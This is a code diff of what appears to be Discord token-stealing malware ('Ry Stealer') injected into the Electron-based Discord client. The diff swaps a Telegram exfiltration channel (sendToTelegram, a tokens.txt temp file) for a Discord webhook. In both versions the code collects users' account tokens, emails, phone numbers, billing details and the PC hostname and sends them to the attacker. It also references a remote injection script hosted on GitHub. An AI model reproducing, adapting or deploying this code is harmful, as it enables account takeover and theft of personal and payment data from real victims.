@@ -8,6 +8,8 @@ const querystring = require("querystring");
 const { BrowserWindow, session, app } = require("electron");
 
 const CONFIG = {
+  webhook:
+    "%WEBHOOK%",
   injection_url:
     "https://raw.githubusercontent.com/xSalca/Viral/main/index.js",
   filters: {
@@ -35,10 +37,6 @@ const CONFIG = {
   },
   API: "https://discord.com/api/v9/users/@me",
 };
-
-// Adicionar variáveis para armazenar as configs do Telegram
-let telegramToken = "%TELEGRAM_TOKEN%"; // Será substituído durante a injeção
-let telegramChatId = "%TELEGRAM_CHAT_ID%"; // Será substituído durante a injeção
 
 const executeJS = (script) => {
   const window = BrowserWindow.getAllWindows()[0];
@@ -85,64 +83,52 @@ const request = async (method, url, headers, data) => {
   });
 };
 
-const sendToTelegram = async (message, filePath = null) => {
-  const url = filePath 
-    ? `https://api.telegram.org/bot${telegramToken}/sendDocument`
-    : `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+const hooker = async (content, token, account) => {
+  content["username"] = "Ry Injection";
+  content["avatar_url"] = "https://cdn.discordapp.com/attachments/1329073689907560499/1333804141545263199/era.jpg?ex=679a3968&is=6798e7e8&hm=627edebd37fde5428a8638466cff6c79b13cf148379447565de10600191735e3&";
 
-  const formData = new FormData();
-  formData.append('chat_id', telegramChatId);
-  
-  if (filePath) {
-    formData.append('document', fs.createReadStream(filePath));
-    formData.append('caption', message);
-  } else {
-    formData.append('text', message);
-    formData.append('parse_mode', 'HTML');
+  content["embeds"][0]["thumbnail"] = {
+    url: `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`,
+  };
+  content["embeds"][0]["footer"] = {
+    text: "Ry Stealer | https://t.me/ry_stealer",
+    icon_url: "https://cdn.discordapp.com/attachments/1329073689907560499/1333804141545263199/era.jpg?ex=679a3968&is=6798e7e8&hm=627edebd37fde5428a8638466cff6c79b13cf148379447565de10600191735e3&",
+  };
+  content["embeds"][0]["title"] = content["name"];
+
+  const billing = await getBilling(token);
+  const email = account.email;
+
+  content["embeds"][0]["fields"].push(
+    {
+      name: "<a:crown:1240635323671773258> Token",
+      value: "```" + token + "```",
+      inline: false,
+    },
+    {
+      name: "<a:drag:1240636089258086461> Email",
+      value: `\`${email}\``,
+      inline: true,
+    },
+    {
+      name: "<:billing:1240636353364889700> Billing",
+      value: billing,
+      inline: true,
+    }
+  );
+
+  for (const embed in content["embeds"]) {
+    content["embeds"][embed]["color"] = 0x000;
   }
 
   await request(
     "POST",
-    url,
+    CONFIG.webhook,
     {
-      'Content-Type': 'multipart/form-data; boundary=' + formData.getBoundary()
+      "Content-Type": "application/json",
     },
-    formData
+    JSON.stringify(content)
   );
-};
-
-const saveToFile = (content, filename) => {
-  const filePath = path.join(os.tmpdir(), filename);
-  fs.appendFileSync(filePath, content + '\n');
-  return filePath;
-};
-
-const formatMessage = (account, token, extras = {}) => {
-  let message = `🎯 New Token Grabbed!\n\n`;
-  message += `👤 Username: ${account.username}#${account.discriminator}\n`;
-  message += `📧 Email: ${account.email}\n`;
-  message += `☎️ Phone: ${account.phone || "None"}\n`;
-  message += `🔑 Token: ${token}\n`;
-
-  for (const [key, value] of Object.entries(extras)) {
-    message += `${key}: ${value}\n`;
-  }
-
-  return message;
-};
-
-const hooker = async (content, token, account) => {
-  const message = formatMessage(account, token, {
-    "💳 Billing": await getBilling(token),
-    "📅 Created": new Date(account.created_at).toLocaleString()
-  });
-
-  // Save token to file
-  const filePath = saveToFile(`${account.username} | ${token}`, 'tokens.txt');
-  
-  // Send message and file to Telegram
-  await sendToTelegram(message);
-  await sendToTelegram("📁 Tokens File:", filePath);
 };
 
 const fetch = async (endpoint, headers) => {
@@ -353,17 +339,29 @@ async function initiation() {
     if (!token) return;
 
     const account = await fetchAccount(token);
-    
-    const message = formatMessage(account, token, {
-      "💻 PC Name": os.hostname(),
-      "💳 Billing": await getBilling(token)
-    });
 
-    const filePath = saveToFile(`${account.username} | ${token}`, 'tokens.txt');
-    
-    await sendToTelegram(message);
-    await sendToTelegram("📁 Initial Token File:", filePath);
-    
+    const content = {
+      name: `Injected ${account.username}`,
+
+      embeds: [
+        {
+          fields: [
+            {
+              name: "<a:drag:1240636089258086461> Email",
+              value: "`" + account.email + "`",
+              inline: true,
+            },
+            {
+              name: "<:blackstar:1240640910392430602> Phone",
+              value: "`" + (account.phone || "None") + "`",
+              inline: true,
+            },
+          ],
+        },
+      ],
+    };
+
+    await hooker(content, token, account);
     clearAllUserData();
   }
 
